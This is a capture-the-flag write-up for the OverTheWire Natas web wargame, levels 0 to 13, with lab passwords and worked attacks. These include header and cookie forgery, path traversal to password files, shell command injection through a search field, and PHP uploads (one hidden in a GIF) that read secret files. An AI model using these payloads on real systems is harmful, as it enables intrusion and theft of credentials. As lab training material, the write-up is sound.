# OverTheWire - Natas Write-up

**Category:** Web **Points:** N/A

**Description:**

> Natas is a wargame hosted by OverTheWire. These challenges are focused on web
> application hacking. There are 33 levels which get progressively more difficult.

## Level 0

Username: natas0
Password: natas0

We are given a simple webpage with the text "The password for the next level is on this
page. Opening the source code we see...

```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## Level 1

Username: natas1
Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

The prompt is "You can find the password for the next level on this page, but 
rightclicking has been blocked!"

On Firefox you can shift-click, you can use burpsuite to intercept the response or
on Mac you can use Option+Command+U to view the source code.

```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Level 2

Username: natas2
Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

The prompt is "There is nothing on this page."

Looking at the source code we see the following:

```
<img src="files/pixel.png">
```

Opening the files directory, we find a users.txt file with the password for natas3

## Level 3

Username: natas3
Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

The prompt is "There is nothing on this page." Looking in the source code we see...

```
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Doing a Google Search for Natas3 shows a directory result we shouldn't have access to.
The users.txt file contains the password for level 4.

## Level 4

Username: natas4
Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

The prompt says "Access disallowed. You are visiting from "" while authorized users 
should come only from "http://natas5.natas.labs.overthewire.org/"

Obviously we don't have access to level 5 yet. The site is pulling the empty string
from the referer data sent in the HTML header. Opening up BurpSuite, we can use
intercepter to modify our request to the site. (some info omitted). If you haven't
set up Burp, there are plenty of tutorials online. This wouldn't work for me in Chrome,
so I'd recommend using Firefox. 

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas5.natas.labs.overthewire.org/
Connection: close
Upgrade-Insecure-Requests: 1
```

## Level 5

Username: natas5
Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

The prompt is "Access disallowed. You are not logged in." There is no information on
the page to signify a way to login, so we can guess that the session data is saved with
a cookie. Let's check intercepter in Burp again. Sure enough we see:

```
Cookie: loggedin=0
```

Changing 0 to 1 we are successfully logged in.

## Level 6

Username: natas6
Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

We are presented with a prompt to enter the secret passcode with a login form. Looking at
the source code we find:

```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Looking at the /includes/secret.inc URL we see a blank page, but viewing the source code
reveals

```
<!--? $secret = "FOEIUWGHFEEUHOFUOIU"; ?-->
```

Putting this secret into the form gives us the password.

## Level 7

Username: natas7
Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 

We are given a page with two links, home and about. Clicking either of these links changes
the URL to include a php variable (ex. ?page=about). There is nothing else of interest
on this page (however the source has a hint about the file structure). We were originally
told in the Natas game overview that all passwords are found in /etc/natas_webpass/natas#

Since the PHP variable is pulling information from the server, let's modify this to
the file path

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

This gives us the password for level 8

## Level 8

Username: natas8
Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

We are given another secret code login with a link to view the page source. Looking at the
source code we see

```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

So digesting what's going on, we have some PHP code. The code is taking the user supplied
secret, running it through the encodeSecret function and checking to see if this matches
the encodedSecret variable. So we can take the encodedSecret variable, and do all of the 
operations in reverse to determine what our final output should be.

The secret was first base64 encoded, then the string was reversed and finally the ASCII
was converted to Hexadecimal. So starting by reversing the hexadecimal to ASCII in
terminal we have.

```
$ echo '3d3d516343746d4d6d6c315669563362' | xxd -r -p | rev | base64 -D
```

We are piping the String into xxd.
xxd - makes a hexdump
-r reverses (ASCII to hexdump)
-p outputs in plaintext
Then piping this into rev, which reverses the String
Then piping this into base64 -D, which decodes the base64

This gives us oubWYf2kBq. Putting this back into the secret field gets us the natas9 PW.

## Level 9

Username: natas9
Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

This page presents us with a search function that looks for words and outputs them to the
page. Looking at the page source, we see the following code:

```
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search>
</form>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```


Submitting a word throws parameters in the URL, one of which is needle. Looking at the
code we can see that they are making a request for the needle parameter value and
assigning this as the $key variable. If the $key is not an empty String, then a linux
command is executed using the passthru function. The command essentially says to search
for a particular word ignoring the case in the file dictionary.txt. We want to modify this
to return our password, which we know is located in /etc/natas_webpass/natas10.

So we want our final command to look like

```
grep -i -v randomword /etc/natas_webpass/natas10; dictionary.txt
```

The -v inverse searches, returning everything but our search (since we don't know the
password we are searching for). The colon will terminate our command so our desired
file can be searched.
Since there is no input cleansing, we can just the following into the search box.

```
-v randomword /etc/natas_webpass/natas10;
```

This returns the natas10 password in the output section.

## Level 10

Username: natas10
Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

This level is similar to the previous one, except they are now filtering out a few
characters. However, they are not filtering out our slash character /. Even though
we can't use the semi-colon, the grep command allows us to grep through multiple files in
one command, so this hasn't prevented us from submitting the following

```
-v randomword /etc/natas_webpass/natas10 dictionary.txt
```

This returns the natas11 password in the output section.

## Level 11

Username: natas11
Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

We are given the prompt "Cookies are protected with XOR encryption" as well as a box to
change the background color of the page & a link to the source code. The code is:

```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>
```

Looking at this code, we can see there is a parameter showpassword, which by default
is set to 'no.' We want to get this to 'yes.' 


```
Cookie: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D

$json = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$encoded = json_encode($json);
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$text = base64_decode($cookie);
$key = '';
for($i=0;$i<strlen($text);$i++) {
    $key .= $text[$i] ^ $encoded[$i % strlen($encoded)];
}
echo $key;
# Echos => qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
# So we can assume our key is qw8J since this is repeated
# Reversing this function we get

<?php
   $key = "qw8J";
   $json = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
   $text = json_encode($json);
   $outText = '';
   for($i=0; $i<strlen($text);$i++){
      $outText .= $text[$i] ^ $key[$i % strlen($key)];
   }
   echo base64_encode($outText);
   
# Echos ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
# This is our new cookie
?>

```

## Level 12

user: natas12
pw: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

```
<?php
$password = file_get_contents('http://natas12.natas.labs.overthewire.org/etc/natas_webpass/natas13');
echo $password;
?>

```

```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas12.natas.labs.overthewire.org/
Content-Type: multipart/form-data; boundary=---------------------------212631173279336003400950079
Content-Length: 552
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------212631173279336003400950079
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------212631173279336003400950079
Content-Disposition: form-data; name="filename"

5c840ftbc7.php
-----------------------------212631173279336003400950079
Content-Disposition: form-data; name="uploadedfile"; filename="myfile.php"
Content-Type: text/php

<?php
$password = file_get_contents('/etc/natas_webpass/natas13');
echo $password;
?>
-----------------------------212631173279336003400950079--
```

## Level 13
user: natas13
pw: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

```
gifsicle --comment "$(< myfile.php)" < poof.gif > poof2.gif
```

Once we have our code loaded into the GIF, we can change out the first filename extension
to have a .php ending. This filename is not checked, it is generated by the code under
the variable name $target_path and is only used to assign the uploaded file a random URL.
However, the parameter below this is the actual file upload. For this, we change our
filename to poof2.phpA.gif. We'll then open the hex view of Burpsuite and change the 'A'
character (41) to a null byte (00). This will have the filter read the file as a GIF, but
when uploaded, php will be parsed as the end of the filename.

```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas13.natas.labs.overthewire.org/index.php

```





